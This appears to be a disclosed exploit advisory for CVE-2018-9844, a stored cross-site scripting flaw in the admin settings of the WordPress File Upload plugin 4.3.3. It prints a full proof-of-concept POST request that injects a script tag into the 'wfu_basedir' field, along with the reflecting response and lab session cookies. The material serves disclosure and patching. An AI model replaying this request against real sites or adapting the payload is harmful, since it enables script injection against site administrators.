@@ -1,0 +1,107 @@
+# Exploit Title: WordPress Plugin WordPress File Upload 4.3.3 - Stored XSS
+# Date: 06/04/2018
+# Exploit Author: ManhNho
+# Vendor Homepage: https://www.iptanus.com/
+# Software Link: https://downloads.wordpress.org/plugin/wp-file-upload.zip
+# Version: 4.3.3
+# Tested on: Windows 7 / Cent OS 6.5
+# CVE : CVE-2018-9844
+# Category : Webapps
+
+Description
+===========
+WordPress File Upload is a WordPress plugin with more than 20.000 active
+installations.
+Version 4.3.3 (and possibly previous versions) are affected by a Stored XSS
+vulnerability in the admin panel ,related to the "Edit_Setting"
+functionality.
+
+
+PoC
+===============
+Request:
+
+POST /wp-admin/options-general.php?page=wordpress_file_upload&action=edit_settings
+HTTP/1.1
+Host: 192.168.1.66
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:59.0) Gecko/20100101
+Firefox/59.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.1.66/wp-admin/options-general.php?page=
+wordpress_file_upload&action=plugin_settings
+Content-Type: multipart/form-data; boundary=---------------------
+------27678165033834
+Content-Length: 906
+Cookie: wordpress_ce39b1fa1561a0e8d46e02ff9e65f6a0=admin%7C1523124759%
+7CYpPsz6ePz7L52pKrUk6uFioJlynhadnrSuv2lKQNhJe%7Ca3c7a75afaaf9ce1db3596b8aa83
+3adeb337f313ef5156fbf93096c1af0cdbbc; wp-settings-1=libraryContent%3Dbrowse;
+wp-settings-time-1=1522504284; PHPSESSID=o6smfv1u6p8rh7cu7v7gl9lm47;
+wordpress_test_cookie=WP+Cookie+check; wordpress_logged_in_
+ce39b1fa1561a0e8d46e02ff9e65f6a0=admin%7C1523124759%
+7CYpPsz6ePz7L52pKrUk6uFioJlynhadnrSuv2lKQNhJe%7C1993c93121805782b8bee82cd013
+6f1a6aa286d4294ed58cb6f95539acdfe5d5
+Connection: close
+Upgrade-Insecure-Requests: 1
+
+-----------------------------27678165033834
+Content-Disposition: form-data; name="_wpnonce"
+
+c9d5733e36
+-----------------------------27678165033834
+Content-Disposition: form-data; name="_wp_http_referer"
+
+/wp-admin/options-general.php?page=wordpress_file_upload&
+action=plugin_settings
+-----------------------------27678165033834
+Content-Disposition: form-data; name="action"
+
+edit_settings
+-----------------------------27678165033834
+Content-Disposition: form-data; name="wfu_basedir"
+
+<script>alert('XSS')</script>
+-----------------------------27678165033834
+Content-Disposition: form-data; name="wfu_postmethod"
+
+fopen
+-----------------------------27678165033834
+Content-Disposition: form-data; name="wfu_admindomain"
+
+siteurl
+-----------------------------27678165033834
+Content-Disposition: form-data; name="submitform"
+
+Update
+-----------------------------27678165033834--
+
+Response:
+
+HTTP/1.1 200 OK
+Date: Thu, 05 Apr 2018 18:15:01 GMT
+Server: Apache/2.2.15 (CentOS)
+X-Powered-By: PHP/5.3.3
+Expires: Wed, 11 Jan 1984 05:00:00 GMT
+Cache-Control: no-cache, must-revalidate, max-age=0
+Pragma: no-cache
+X-Frame-Options: SAMEORIGIN
+Referrer-Policy: same-origin
+Connection: close
+Content-Type: text/html; charset=UTF-8
+Content-Length: 28623
+...
+
+<input name="wfu_basedir" id="wfu_basedir" type="text"
+value="<script>alert('XSS')</script>" />
+<p style="cursor: text; font-size:9px; padding: 0px; margin: 0px; width:
+95%; color: #AAAAAA;">Current value: <strong><script>alert('XSS')</
+script></strong></p>
+...
+
+
+References
+===============
+https://www.iptanus.com/new-version-4-3-4-of-wordpress-file-upload-plugin/
+https://wordpress.org/plugins/wp-file-upload/#developers
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-9844
